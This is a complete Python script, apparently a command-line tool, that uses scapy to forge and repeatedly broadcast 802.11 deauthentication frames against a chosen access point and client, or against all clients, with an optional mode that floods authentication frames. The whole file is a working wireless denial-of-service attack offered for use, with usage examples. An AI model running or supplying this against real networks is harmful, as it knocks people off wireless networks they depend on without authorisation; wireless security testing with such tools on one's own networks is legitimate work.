import sys
from scapy.all import *


def deauth():
        conf.iface = sys.argv[1]
        bssid = sys.argv[2]
        conf.verb = 0

        if len(sys.argv) == 5 :
                client = sys.argv[3]
                count = sys.argv[4]

        if len(sys.argv) == 4 :
                client = "FF:FF:FF:FF:FF:FF"
                count = sys.argv[3]

        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)

        for n in range(int(count)):
                sendp(packet)

def auth():
        conf.iface = sys.argv[1]
        bssid = sys.argv[2]
        client = sys.argv[3]
        count = sys.argv[4]

        packet = RadioTap()/Dot11(type=0,subtype=11,addr1=bssid,addr2=client,addr3=client)/Dot11Auth(seqnum=1)

        for n in range(int(count)):
                sendp(packet)

if not (len(sys.argv) == 6 or len(sys.argv) == 5 or len(sys.argv) == 4):
        print ('Usage is ./scapy-deauth.py interface bssid [client] count [auth]')
        print ('Example - ./scapy-deauth.py mon0 00:11:22:33:44:55 55:44:33:22:11:00 50 [auth]')
        sys.exit(1)


chk = 0;
for i in range(len(sys.argv)):
        if sys.argv[i] == "auth":
                chk = 1

if chk == 0:
        deauth()
elif chk == 1:
        auth()
